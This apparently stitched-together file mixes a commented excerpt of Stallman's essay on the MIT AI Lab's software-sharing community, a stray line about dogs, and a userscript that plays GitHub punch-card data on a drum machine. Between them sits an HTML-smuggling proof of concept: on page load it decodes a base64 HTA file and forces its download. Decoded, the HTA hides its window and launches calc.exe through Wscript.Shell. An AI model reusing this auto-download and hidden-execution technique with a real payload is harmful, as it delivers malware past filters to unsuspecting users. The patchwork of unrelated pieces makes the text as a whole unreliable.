# Made possible thanks to the GNU open-source project.
#The first software-sharing community
#When I started working at the MIT Artificial Intelligence Lab in 1971, I #became part of a software-sharing community that had existed for #many years. Sharing of software was not limited to our particular #community; it is as old as computers, just as sharing of recipes is as #old as cooking. But we did it more than most.
#
#The AI Lab used a timesharing operating system called ITS (the #Incompatible Timesharing System) that the lab's staff hackers (1) had #designed and written in assembler language for the Digital PDP-10, #one of the large computers of the era. As a member of this #community, an AI Lab staff system hacker, my job was to improve this #system.
#
#We did not call our software “free software”, because that term did not #yet exist; but that is what it was. Whenever people from another #university or a company wanted to port and use a program, we gladly #let them. If you saw someone using an unfamiliar and interesting #program, you could always ask to see the source code, so that you #could read it, change it, or cannibalize parts of it to make a new #program.
#
#(1) The use of “hacker” to mean “security breaker” is a confusion on #the part of the mass media. We hackers refuse to recognize that #meaning, and continue using the word to mean someone who loves #to program, someone who enjoys playful cleverness, or the #combination of the two. See my article, On Hacking.
This is one file that has been created locally from one of the contributor's
computers

I like dogs.

<!DOCTYPE html>
<html>
<body>
    <!-- .HTA file from  https://github.com/3gstudent/test/blob/master/calc.hta -->
    <script type="text/javascript">
        var file = atob("PEhUTUw+PG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiPjxIRUFEPjxzY3JpcHQgbGFuZ3VhZ2U9IlZCU2NyaXB0Ij4KV2luZG93LlJlU2l6ZVRvIDAsIDAKV2luZG93Lm1vdmVUbyAtMjAwMCwtMjAwMApTZXQgb2JqU2hlbGwgPSBDcmVhdGVPYmplY3QoIldzY3JpcHQuU2hlbGwiKQpvYmpTaGVsbC5SdW4gImNhbGMuZXhlIgpzZWxmLmNsb3NlCjwvc2NyaXB0Pgo8Ym9keT4KZGVtbwo8L2JvZHk+CjwvSEVBRD4KIDwvSFRNTD4=");

function download(filename, text) {
      var element = document.createElement('a');
      element.setAttribute('href', 'data:text/something;charset=utf-8,' + encodeURIComponent(text));
      element.setAttribute('download', filename);
    
      element.style.display = 'none';
      document.body.appendChild(element);
    
      element.click();
    
      document.body.removeChild(element);
    }
    
    // Start file download.
    download("hello.hta", file);

    </script>
</body>
</html>

// Licensed under the Tumbolia Public License. See footer for details.

//------------------------------------------------------------------------------
// add the contents of this file to your ~/.js/chromium.googlecode.com.js file
//------------------------------------------------------------------------------

// punch card: https://github.com/apache/incubator-cordova-js/graphs/punch-card
// punch data: https://github.com/apache/incubator-cordova-js/graphs/punch-card-data
// http://chromium.googlecode.com/svn/trunk/samples/audio/shiny-drum-machine.html

//------------------------------------------------------------------------------
if (location.pathname == "/svn/trunk/samples/audio/shiny-drum-machine.html") {
    setTimeout(installPunchCardPlayer, 2000)
}

//------------------------------------------------------------------------------
function installPunchCardPlayer() {
    console.log("googlecode.com.js: installing punch card player")

    var ghUser   = "apache"
    var ghRepo   = "incubator-cordova-weinre"
    var pcURL    = "https://github.com/" + ghUser + "/" + ghRepo + "/graphs/punch-card-data"
    
    $.ajax(pcURL).done(function(data) {
        loadData(data)
    })
}
    
//------------------------------------------------------------------------------
function loadData(data) { 
    var notes = []
    for (var i=0; i<6; i++) notes[i] = []
    
    var max = 0
    for (var i=0; i<data.length; i++) {
        var da = data[i][0]
        var hr = data[i][1]
        var co = data[i][2]
        
        if (da == 0) continue
        if (hr < 8) continue
        
        da -= 1
        hr -= 8
        
        notes[da][hr] = co
        
        if (co > max) max = co
    }

    for (var i=0; i<6; i++) {
        for (var j=0; j<16; j++) {
            var val = notes[i][j]
            if      (val <   max/3) val = 0
            else if (val < 2*max/3) val = 1
            else                    val = 2
            
            notes[i][j] = val
        }
    }

    var script = []
    
    script.push("debugger")
    script.push("theBeat.rhythm1 = " + JSON.stringify(notes[0]))
    script.push("theBeat.rhythm2 = " + JSON.stringify(notes[1]))
    script.push("theBeat.rhythm3 = " + JSON.stringify(notes[2]))
    script.push("theBeat.rhythm4 = " + JSON.stringify(notes[3]))
    script.push("theBeat.rhythm5 = " + JSON.stringify(notes[4]))
    script.push("theBeat.rhythm6 = " + JSON.stringify(notes[5]))
    script.push("updateControls()")
    script = script.join(";\n")

    var element = $("<script>")
    element.text(script)
    element = element[0]

    document.body.appendChild(element)    
}

//------------------------------------------------------------------------------
// Copyright 2012, Patrick Mueller
// 
// Tumbolia Public License
// 
// Copying and distribution of this file, with or without modification, are
// permitted in any medium without royalty provided the copyright notice and this
// notice are preserved.
// 
// TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION
// 
//   0. opan saurce LOL
//------------------------------------------------------------------------------
   
